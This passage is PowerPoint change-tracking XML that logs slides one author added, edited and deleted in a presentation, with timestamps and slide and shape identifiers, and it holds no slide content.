      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:47:53.626" v="0"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1304173137" sldId="565"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:47:53.626" v="0"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4287828734" sldId="566"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:47:53.626" v="0"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="703981492" sldId="567"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:47:53.626" v="0"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3848631559" sldId="568"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:47:53.626" v="0"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3064435983" sldId="569"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:47:53.626" v="0"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1225798262" sldId="570"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:47:53.626" v="0"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2709038548" sldId="571"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:47:53.626" v="0"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2443949057" sldId="572"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:47:53.626" v="0"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="389886616" sldId="573"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1466183401" sldId="574"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="310068067" sldId="575"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3659702837" sldId="576"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="147673374" sldId="577"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2574950507" sldId="578"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="576856700" sldId="579"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1473323659" sldId="580"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3096183903" sldId="581"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3140399215" sldId="582"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4002251207" sldId="583"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2700759875" sldId="584"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T00:51:56.828" v="12" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2113802537" sldId="585"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T00:51:56.828" v="12" actId="14100"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2113802537" sldId="585"/>
            <ac:spMk id="3" creationId="{2FFCDB1D-5027-BCD8-1B0D-724E644D94BF}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod modNotes modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:03:24.236" v="43" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="676358336" sldId="586"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:03:24.236" v="43" actId="113"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="676358336" sldId="586"/>
            <ac:spMk id="3" creationId="{20B5834F-BD16-1E9D-05D4-B5585E90C1EC}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="741726240" sldId="587"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2889435976" sldId="588"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2872974777" sldId="589"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:05:56.415" v="69" actId="6549"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1477271646" sldId="590"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="30904929" sldId="591"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:07:02.997" v="72" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2006671341" sldId="592"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:07:02.997" v="72" actId="113"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2006671341" sldId="592"/>
            <ac:spMk id="3" creationId="{DE3A1571-969A-1A49-74D8-4F40966103E9}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="380842207" sldId="593"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1803638171" sldId="594"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:12:44.101" v="73" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2484107621" sldId="595"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3462811783" sldId="596"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:17:44.029" v="75" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4261039278" sldId="597"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:13:53.423" v="74" actId="113"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4261039278" sldId="597"/>
            <ac:spMk id="3" creationId="{92C2C465-1C56-F897-CAC9-7441191730D1}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="867191341" sldId="598"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1255055280" sldId="599"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod modNotesTx">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:26:49.805" v="91" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2798065730" sldId="600"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:26:06.732" v="86" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2798065730" sldId="600"/>
            <ac:spMk id="3" creationId="{7DF96E71-F558-9ABA-2ED5-78E4BD1E3086}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:28:42.853" v="109" actId="403"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4060995429" sldId="601"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:28:40.509" v="108" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4060995429" sldId="601"/>
            <ac:spMk id="2" creationId="{29821564-F42E-2BBA-BDA5-0C918BCCBC5C}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:28:42.853" v="109" actId="403"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4060995429" sldId="601"/>
            <ac:spMk id="3" creationId="{2E4D330A-D42D-4817-AF1D-149447AA4C64}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3456353733" sldId="602"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:31:53.836" v="110" actId="403"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2146517897" sldId="603"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:31:53.836" v="110" actId="403"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2146517897" sldId="603"/>
            <ac:spMk id="3" creationId="{049CF876-2B7B-467F-1BD7-0E44483D06F3}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3009814500" sldId="604"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1425378504" sldId="605"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:37:16.870" v="111" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="314423800" sldId="606"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:37:16.870" v="111" actId="113"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="314423800" sldId="606"/>
            <ac:spMk id="3" creationId="{63F7BE76-74F1-9B3F-8FF8-FD6CE8280A35}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1638073292" sldId="607"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-22T10:48:09.565" v="1"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3345831628" sldId="608"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp new mod">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:28:23.504" v="103" actId="113"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3822768820" sldId="609"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:27:26.900" v="95"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3822768820" sldId="609"/>
            <ac:spMk id="2" creationId="{90212BAA-ECCD-D671-CBD6-CF9826BABBD7}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="mod">
          <ac:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{EF65648A-D124-4FC9-9E19-AD4EA74EA410}" dt="2025-09-24T01:28:23.504" v="103" actId="113"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3822768820" sldId="609"/>
            <ac:spMk id="3" creationId="{2241749A-0390-3509-04E1-59FDDE5D7E50}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}"/>
    <pc:docChg chg="undo redo custSel addSld delSld modSld sldOrd delMainMaster modMainMaster">
      <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-09-26T05:28:15.417" v="2325" actId="113"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="addSp delSp modSp mod modAnim">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-19T03:04:18.145" v="1002" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="256"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="257"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="258"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="259"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="260"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="261"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="262"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="263"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="264"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="265"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="266"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="267"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="268"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="269"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="270"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="271"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="272"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Arvind Prasad" userId="220fd94fb4863314" providerId="LiveId" clId="{560289BC-0C73-4579-B47A-BA5A2BBC9F47}" dt="2024-08-05T10:03:53.351" v="0" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="0" sldId="273"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
